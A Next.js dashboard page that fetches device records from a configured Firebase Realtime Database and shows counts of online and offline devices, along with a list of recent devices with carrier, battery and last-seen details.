'use client';

import { useEffect, useState, useCallback } from 'react';
import { Smartphone, Wifi, WifiOff, RefreshCw, Settings2 } from 'lucide-react';
import { useAuth } from '@/components/auth-provider';
import Link from 'next/link';

interface QuickDevice {
  id: string;
  name: string;
  online: boolean;
  battery?: number;
  network?: string;
  lastSeen?: number;
}

function toStr(v: unknown): string {
  return v != null ? String(v).trim() : '';
}
function toNum(v: unknown): number | undefined {
  if (typeof v === 'number') return v;
  if (typeof v === 'string' && v !== '') { const n = Number(v); if (!isNaN(n)) return n; }
  return undefined;
}
function firstVal(obj: Record<string, unknown>, keys: string[]): unknown {
  for (const k of keys) if (obj[k] != null && obj[k] !== '') return obj[k];
  return undefined;
}

function parseQuick(id: string, raw: Record<string, unknown>): QuickDevice {
  const flat: Record<string, unknown> = { ...raw };
  const sims = raw['sims'] ?? raw['Sims'];
  if (Array.isArray(sims) && sims.length > 0) {
    const s0 = sims[0] as Record<string, unknown>;
    if (s0?.network && !flat['network']) flat['network'] = s0.network;
    if (s0?.provider && !flat['provider']) flat['provider'] = s0.provider;
    if (s0?.operator && !flat['operator']) flat['operator'] = s0.operator;
  }
  const nets = raw['networks'] ?? raw['Networks'];
  if (Array.isArray(nets) && nets.length > 0 && !flat['provider']) flat['provider'] = String(nets[0]);

  const onlineKeys = ['online', 'Online', 'isOnline', 'connected'];
  const online = onlineKeys.some(k => raw[k] === true) ||
    ['status', 'Status', 'connection'].some(k => String(raw[k] ?? '').toLowerCase() === 'online');

  const brand = toStr(firstVal(flat, ['Brand', 'brand']));
  const model = toStr(firstVal(flat, ['modelName', 'model', 'Model', 'deviceModel', 'Device', 'phoneModel']));
  const name = brand && model && !model.toLowerCase().startsWith(brand.toLowerCase())
    ? `${brand} ${model}` : (model || brand || id.slice(0, 12));

  return {
    id,
    name,
    online,
    battery: toNum(firstVal(flat, ['batteryPercent', 'battery', 'Battery', 'bat', 'charge'])),
    network: toStr(firstVal(flat, ['provider', 'Provider', 'network', 'Network', 'operator', 'carrier'])) || undefined,
    lastSeen: toNum(firstVal(flat, ['lastSeen', 'updatedAt', 'timestamp', 'time'])),
  };
}

function loadRtdbUrl(): string {
  try { return localStorage.getItem('panel_rtdb_url') ?? ''; } catch { return ''; }
}

function timeAgo(ts: number): string {
  const diff = Math.floor((Date.now() - ts) / 1000);
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return `${Math.floor(diff / 86400)}d ago`;
}

export default function DashboardPage() {
  const { idToken, user } = useAuth();
  const [devices, setDevices] = useState<QuickDevice[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [rtdbUrl, setRtdbUrl] = useState('');

  useEffect(() => { setRtdbUrl(loadRtdbUrl()); }, []);

  const fetchDevices = useCallback(async () => {
    const url = loadRtdbUrl();
    if (!url || !idToken) return;
    setLoading(true);
    setError('');
    try {
      const base = url.replace(/\/$/, '');
      const res = await fetch(`${base}/clients.json?auth=${idToken}`, {
        cache: 'no-store',
        signal: AbortSignal.timeout(10000),
      });
      if (!res.ok) {
        setError(`Firebase ${res.status}`);
        return;
      }
      const data = await res.json();
      if (!data || typeof data !== 'object') { setDevices([]); return; }
      const parsed = Object.entries(data as Record<string, unknown>)
        .filter(([, v]) => v && typeof v === 'object' && !Array.isArray(v))
        .map(([id, raw]) => parseQuick(id, raw as Record<string, unknown>))
        .sort((a, b) => (b.lastSeen ?? 0) - (a.lastSeen ?? 0));
      setDevices(parsed);
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Fetch failed');
    } finally {
      setLoading(false);
    }
  }, [idToken]);

  useEffect(() => {
    fetchDevices();
    const t = setInterval(fetchDevices, 30_000);
    return () => clearInterval(t);
  }, [fetchDevices]);

  const onlineCount = devices.filter(d => d.online).length;
  const recent = devices.slice(0, 8);

  if (!rtdbUrl) {
    return (
      <div className="flex flex-col items-center justify-center h-96 gap-4 text-center">
        <Settings2 className="w-12 h-12 text-slate-300 dark:text-slate-600" />
        <div>
          <p className="text-slate-700 dark:text-slate-300 font-medium">Firebase RTDB URL nahi hai</p>
          <p className="text-sm text-slate-400 mt-1">Settings mein jaake URL set karo</p>
        </div>
        <Link href="/settings" className="btn-primary">Settings</Link>
      </div>
    );
  }

  return (
    <div className="space-y-5 animate-fade-in">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-900 dark:text-white">Dashboard</h1>
          <p className="text-sm text-slate-500 dark:text-slate-400 mt-0.5">
            Welcome back{user?.email ? `, ${user.email.split('@')[0]}` : ''}
          </p>
        </div>
        <button onClick={fetchDevices} disabled={loading} className="btn-secondary p-2">
          <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
        </button>
      </div>

      <div className="grid grid-cols-3 gap-4">
        <div className="card p-5">
          <div className="flex items-center justify-between mb-3">
            <p className="text-xs font-semibold text-slate-400 tracking-wide uppercase">Total</p>
            <div className="w-8 h-8 rounded-lg bg-slate-100 dark:bg-slate-700 flex items-center justify-center">
              <Smartphone className="w-4 h-4 text-slate-500 dark:text-slate-400" />
            </div>
          </div>
          <p className="text-3xl font-bold text-slate-900 dark:text-white">{devices.length}</p>
          <p className="text-xs text-slate-400 mt-1">registered devices</p>
        </div>

        <div className="card p-5">
          <div className="flex items-center justify-between mb-3">
            <p className="text-xs font-semibold text-slate-400 tracking-wide uppercase">Online</p>
            <div className="w-8 h-8 rounded-lg bg-emerald-50 dark:bg-emerald-950 flex items-center justify-center">
              <Wifi className="w-4 h-4 text-emerald-500" />
            </div>
          </div>
          <p className="text-3xl font-bold text-emerald-600 dark:text-emerald-400">{onlineCount}</p>
          <p className="text-xs text-slate-400 mt-1">
            {devices.length > 0 ? `${Math.round(onlineCount / devices.length * 100)}% active` : 'no devices'}
          </p>
        </div>

        <div className="card p-5">
          <div className="flex items-center justify-between mb-3">
            <p className="text-xs font-semibold text-slate-400 tracking-wide uppercase">Offline</p>
            <div className="w-8 h-8 rounded-lg bg-slate-100 dark:bg-slate-700 flex items-center justify-center">
              <WifiOff className="w-4 h-4 text-slate-400" />
            </div>
          </div>
          <p className="text-3xl font-bold text-slate-500 dark:text-slate-400">{devices.length - onlineCount}</p>
          <p className="text-xs text-slate-400 mt-1">inactive devices</p>
        </div>
      </div>

      {error && (
        <div className="bg-red-50 dark:bg-red-950 border border-red-200 dark:border-red-800 rounded-lg px-4 py-3 text-sm text-red-600 dark:text-red-400">
          {error}
        </div>
      )}

      <div className="card">
        <div className="flex items-center justify-between p-4 border-b border-slate-100 dark:border-slate-700/50">
          <h2 className="text-sm font-semibold text-slate-900 dark:text-white">Recent Devices</h2>
          <Link href="/devices" className="text-xs text-brand-600 dark:text-brand-400 hover:underline font-medium">View all →</Link>
        </div>

        {loading && devices.length === 0 ? (
          <div className="divide-y divide-slate-100 dark:divide-slate-700/50">
            {Array.from({ length: 5 }).map((_, i) => (
              <div key={i} className="flex items-center gap-3 px-4 py-3 animate-pulse">
                <div className="w-2 h-2 rounded-full bg-slate-100 dark:bg-slate-700 flex-shrink-0" />
                <div className="h-3 bg-slate-100 dark:bg-slate-700 rounded w-1/3" />
                <div className="ml-auto h-3 bg-slate-100 dark:bg-slate-700 rounded w-16" />
              </div>
            ))}
          </div>
        ) : recent.length === 0 ? (
          <div className="px-4 py-8 text-center text-sm text-slate-400">Koi device nahi mila</div>
        ) : (
          <div className="divide-y divide-slate-100 dark:divide-slate-700/50">
            {recent.map(device => (
              <div key={device.id} className="flex items-center gap-3 px-4 py-3 hover:bg-slate-50 dark:hover:bg-slate-800/30 transition-colors">
                <div className={`w-2 h-2 rounded-full flex-shrink-0 ${device.online ? 'bg-emerald-500 animate-pulse' : 'bg-slate-300 dark:bg-slate-600'}`} />
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-medium text-slate-900 dark:text-white truncate">{device.name}</p>
                  {device.network && <p className="text-xs text-slate-400 truncate">{device.network}</p>}
                </div>
                <div className="flex-shrink-0 text-right">
                  <p className={`text-xs font-medium ${device.online ? 'text-emerald-600 dark:text-emerald-400' : 'text-slate-400'}`}>
                    {device.online ? 'Online' : 'Offline'}
                  </p>
                  {device.battery != null && (
                    <p className="text-[10px] text-slate-400">{device.battery}%</p>
                  )}
                </div>
                {device.lastSeen && !device.online && (
                  <p className="text-[10px] text-slate-400 flex-shrink-0 w-14 text-right">{timeAgo(device.lastSeen)}</p>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
